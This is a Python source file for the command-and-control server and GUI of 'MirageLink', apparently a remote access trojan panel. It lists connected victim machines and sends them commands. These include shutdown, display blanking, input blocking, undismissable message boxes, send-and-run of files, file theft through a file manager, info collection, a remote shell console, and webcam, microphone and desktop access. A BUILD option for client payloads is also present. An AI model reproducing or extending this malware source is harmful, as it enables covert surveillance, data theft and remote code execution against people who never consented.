import customtkinter as ctk
import socket
import soundpad
import pygame
import os
import time
import queue
import json
import threading

from tkinter import messagebox, filedialog

from config import load_settings, create_key
from frames.plugins import console, remote_tool, file_manager
from frames import (settings, build_config, collect_info,
                    function, info)


"Server and handling ivents"
class Server(ctk.CTk):
    def __init__(self, host, port, host_remote, port_remote, key, gui):
        self.host = host #main host
        self.port = port  #main port
        self.host_remote = host_remote #this only for remote tool - microphone, webcam, remote desktop
        self.port_remote = port_remote #this only for remote tool - microphone, webcam, remote desktop

        self.gui = gui
        self.key = key

        self.clients = []  
        self.running = False  

        self.msg_queue = queue.Queue()

    def start_server(self):
        "Start server and handling new clients"
        self.running = True
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                server_socket.bind((self.host, self.port))
                server_socket.listen(10)
                print(f"Server runned: {self.host}:{self.port}")

                while self.running:
                    conn, addr = server_socket.accept()
                    print(f"New connection: {addr}")

                    "Check secret key, if not valid - not connected"
                    try:
                        data = conn.recv(1024)
                        if data.decode().strip() != self.key:
                            conn.send("exit".encode('utf-8'))
                            conn.close()
                            print(f"Not valid key: {addr}. connection close")
                            continue
                    except Exception as e:
                        print(f"Error to get key! {addr}: {e}")
                        conn.close()
                        continue

                    client_info = {"conn": conn, "addr": addr, "ip": addr[0], "port": addr[1], "country": "Unknown"}
                    self.clients.append(client_info)

                    self.gui.after(0, self.gui.create_users_app, self.clients)

                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()

                    soundpad.play_connect()
        except Exception as e:
            print(f"Server error: {e}")
        finally:
            self.running = False

    def stop_server(self):
        self.running = False
        print("Stop server")

    def send_msg(self, msg):
        messagebox.showinfo('MirageLink', msg)

    def handle_client(self, conn, addr):
        "Handle command from client"
        ip, port = addr
        try:
            with conn:
                while self.running:
                    data = conn.recv(1024)
                    command = data.decode('utf-8', errors="ignore").strip()
                    
                    if not command:
                        break  

                    if command.startswith("FILE"):
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                    
                    elif command == "info":
                        info = conn.recv(5000).decode()
                        collect_info.CollectionsInfo(info)

                    else:
                        self.msg_queue.put((addr, command))

        except (ConnectionError, socket.error) as e:
            print(f"Client {addr} disconnected: {e}")
        except (Exception) as e:
            print(f"Handle error: {e}")
        finally:
            soundpad.play_disconnect()
            print(f"Connection: {addr} closed")
            self.remove_client(addr)

    def send_to_client(self, ip, port, message):
        "This need to execute command from CommandFunction and send command to client"
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    client["conn"].send(message.encode('utf-8'))
                    print(f"Message sended: {ip}:{port}")

                    if 'send' in message:
                        filepath = message[4:].strip()
                        print(f'Sended: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 'set_wallpaper' in message:
                        filepath = message[13:].strip()
                        print(f'Sended wallpaper: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()
                    
                    elif 'screemer' in message:
                        filepath = message[8:].strip()
                        print(f'Sended wallpaper: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 's_run' in message:
                        filepath = message[5:].strip()
                        print(f'Send and run: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 'download' in message:
                        file = message[8:].strip()
                        print(f'Download: {file}')
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                    
                    elif message == "remote":
                        print("Remote Tool Activated")
                        self.remote = remote_tool.RemoteServer(host=self.host_remote, port=self.port_remote)#start new socket for remote
                    
                except Exception as e:
                    print(f"Error sending {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found")

    def send_file(self, filename, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    if os.path.exists(filename):
                        file_size = os.path.getsize(filename)
                        header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
                        print(header)
                        client["conn"].send(header.ljust(1024)) 
                        time.sleep(1)
                        with open(filename, 'rb') as file:
                            while True:
                                data = file.read(24576)  
                                if not data:
                                    break
                                client["conn"].send(data)  
                        print(f"File {filename} succeful sended to: {ip}:{port}.")
                    else:                        
                        client["conn"].send(b"FILE_NOT_FOUND")
                        print(f"File {filename} not found.")
                    
                except Exception as e:
                    print(f"Error in send file to client: {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found.")

    def download_file(self, save_path, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    header = client["conn"].recv(1024).decode('utf-8').strip()
                    if header.startswith("FILE"):
                        parts = header.split()
                        file_size = int(parts[1])
                        filename = parts[2]

                        save_filename = os.path.join(save_path, filename)

                        client["conn"].send(b"SEND_FILE")

                        with open(save_filename, 'wb') as file:
                            received = 0
                            while received < file_size:
                                data = client["conn"].recv(24576)
                                if not data:
                                    break
                                file.write(data)
                                received += len(data)
                        print(f"File {filename} succeful download from: {ip}:{port}.")
                    else:
                        print("Error in download, not valid title.")
                        print(header)
                except Exception as e:
                    print(f"Error in download file from client: {ip}:{port}: {e}")
                return
        print(f"Client {ip}:{port} not found")

    def remove_client(self, addr):
        ip, port = addr
        print(f"Remove client: {ip}:{port}")
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                self.clients.remove(client)
                break
        self.gui.after(0, self.gui.create_users_app, self.clients)


"Main frame gui"
class MirageApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("MirageLink")
        self.geometry("1000x500")
        self.resizable(False, True)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.users = []
        self.user_frames = []

        create_key() #create secret key for acces to server
        self.load = load_settings()#load json configuration for server and gui

        self.HOST, self.PORT = self.load['host'], self.load['port']
        self.host_remote, self.port_remote =self.load['host_remote'], self.load['port_remote']
        self.key = self.load["key"]

        self.server = Server(self.HOST, self.PORT, self.host_remote, self.port_remote, self.key, self)
        server_thread = threading.Thread(target=self.server.start_server, daemon=True).start()

        self.create_app()


    def create_app(self):
        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#1e1f26')
        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='⚉ MirageLink ⚉ made by: GBW ♥', text_color='white', font=('Bold', 30))
        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#283655')

        self.gbw_frame.pack(side='top', fill='x')
        self.gbw_title.pack(side='left', pady=10)
        self.menu.pack(side='top', fill='x')

        self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
        self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
        self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
        self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='white', font=('Bold', 15),
                                          fg_color='#283655', command=self.draw_config_app)
        self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='white', font=('Bold', 15),
                                          fg_color='#283655', command=self.draw_info_app)
        self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='white', font=('Bold', 15),
                                          fg_color='#283655', command=self.draw_settings_app)
        
        self.text_ip.pack(side='left', padx=75)
        self.text_port.pack(side='left', padx=75)
        self.text_contry.pack(side='left', padx=75)
        self.builder_btn.pack(side='right', padx=5)
        self.setting_btn.pack(side='right', padx=5)
        self.info_btn.pack(side='right', padx=5)
    
    
    def create_user(self, ip, port, country):
        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#4d648d', corner_radius=10)
        user_ground.pack(side='top', padx=10, pady=5, fill='x')

        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="white", font=('Bold', 15))
        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="white", font=('Bold', 15))
        select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#1e1f26')
        
        user_ip.pack(side='left', padx=50)
        user_port.pack(side='left', padx=50)
        user_contry.pack(side='left', padx=50)
        select_func_button.pack(side='right', pady=5, padx=5)

        self.user_frames.append(user_ground)

    def clear_users(self):
        for frame in self.user_frames:
            frame.destroy()
        self.user_frames.clear()

    def create_users_app(self, users: list):
        self.clear_users() 
        for user in users:
            self.create_user(user["ip"], user["port"], user["country"])

    @soundpad.play_click()
    def draw_settings_app(self):
        self.setting_app = settings.SettingsApp(self)
        self.setting_app.grab_set()

    @soundpad.play_click()
    def draw_info_app(self):
        self.info_app = info.InfoApp(self)
        self.info_app.grab_set()

    @soundpad.play_click()
    def draw_config_app(self):
        self.config_app = build_config.BuildConfigApp(self) 
        self.config_app.grab_set() 

    @soundpad.play_click()
    def draw_func_app(self, ip, port):
        func_app = function.FunctionApp(ip, port, self.server)
        threading.Thread(target=func_app.mainloop()).start()


"Execute command from gui, send command to server"
class CommandFunction:
    def __init__(self, server):
        self.server = server

    @soundpad.play_click()
    def off_pc(self, ip, port, reboot=False):
        if reboot == False:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'off'), daemon=True).start()
        else:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'reboot'), daemon=True).start()

    @soundpad.play_click()
    def display_controll(self, ip, port, on=False):
        if on == False:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display black'), daemon=True).start()
        else:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display white'), daemon=True).start()

    @soundpad.play_click()
    def set_wallpaper(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'set_wallpaper {file_path}'), daemon=True).start()

    @soundpad.play_click()
    def msg_box(self, ip, port, msg, no_close=False):
        if no_close == False:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'msg {msg}'), daemon=True).start()
        else:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'no_close_box {msg}'), daemon=True).start()

    @soundpad.play_click()
    def console(self, ip, port):
        self.console_app = console.ConsoleApp(ip, port, self.server)

    @soundpad.play_click()
    def block_input(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, 'block_input'), daemon=True).start()

    @soundpad.play_click()
    def remote_tool(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port,'remote'), daemon=True).start()

    @soundpad.play_click()
    def get_info(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, 'get_info'), daemon=True).start()

    @soundpad.play_click()
    def open_link(self, ip, port, link):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'open_link {link}'), daemon=True).start()

    @soundpad.play_click()
    def send_and_run(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f's_run {file_path}'), daemon=True).start()
    
    @soundpad.play_click()
    def screemer(self, ip, port):
        print("Screemer in dev")
        """
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'screemer {file_path}'), daemon=True).start()
        """
    
    @soundpad.play_click()
    def send_file(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()

    @soundpad.play_click()
    def file_manager(self, ip, port):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, "file start")).start()

        addr, files_json = self.server.msg_queue.get()
        files_list = json.loads(files_json)
        self.file_app = file_manager.FileManagerApp(ip, port, self.server, files_list)

    @soundpad.play_click()
    def download_file(self, ip, port, filename):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()

    @soundpad.play_click()
    def killer(self, ip, port, kill=False):
        data = messagebox.askyesno('MirageLink', 'You sure ???')
        if data == True:
            if kill == False:
                threading.Thread(target=self.server.send_to_client, args=(ip, port, 'exit'), daemon=True).start()
            threading.Thread(target=self.server.send_to_client, args=(ip, port, 'kill'), daemon=True).start()

    @soundpad.play_click()
    def post_msg(self, ip, port, msg):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()

    @soundpad.play_click()
    def send_msg(self, msg):
        data = messagebox.showinfo('MirageLink', msg)
        return data


def main():
    app = MirageApp().mainloop()

if __name__ == "__main__":
    main()
